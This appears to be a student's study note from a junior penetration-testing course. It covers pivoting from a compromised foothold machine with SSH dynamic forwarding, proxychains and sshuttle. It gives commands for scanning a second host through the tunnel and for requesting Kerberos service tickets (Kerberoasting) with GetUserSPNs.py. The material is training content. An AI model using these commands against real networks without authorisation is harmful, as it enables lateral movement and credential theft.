## Quick-Use

**Commands**:

After root access on foothold, using a trivial foothold as example:
#### Proxychains
- `ssh -f -N -D -i IDFILENAME root@1stTARGIPADDR` - set up proxy to user, then: 
    - `-i` specifies identity file (makes the ssh process easier)
    - `-f` backgrounds the ssh
    - `-N` is basically saying that we don't need to exec commands, man pages note that it's great for port forwarding
    - `-D` specifies which port to bind to, found within the `etc/proxychains.conf` file under the SOCKS field\

Once `proxychains` is setup, then you may:
- enumerate second machine, may not work well - `proxychains nmap -pPORTNUM 2ndTARGIPADDR`
- run attacks, such as [[2_Studies/Courses/Current/CERTPREP - PJPT-Practical Jr Pen Tester/Practical Ethical Hacking/2_Enumeration/Post-Compromise Enumeration/Active Directory/Kerberoasting]]- `proxychains GetUserSPNs.py DOMAIN.name/username:Passwd1 -dc-ip 2ndTARGIPADDR -request`
- Access webapps from foothold machine - after closing your own firefox: `proxychains firefox`

#### SSHuttle
- `sshuttle -r root@1stTARGIPADDR 2ndTARGIPADDR/24 --ssh-cmd "ssh -i IDFILENAME"`

*Tools*:
- `proxychains` - b sure to check `/etc/proxychains.conf` for which IP and port to bind to under SOCKS field
- `nmap`
- `sshuttle`

## General

**Objectives**:
Pivot from foothold user to another user that will allow you to obtain higher access
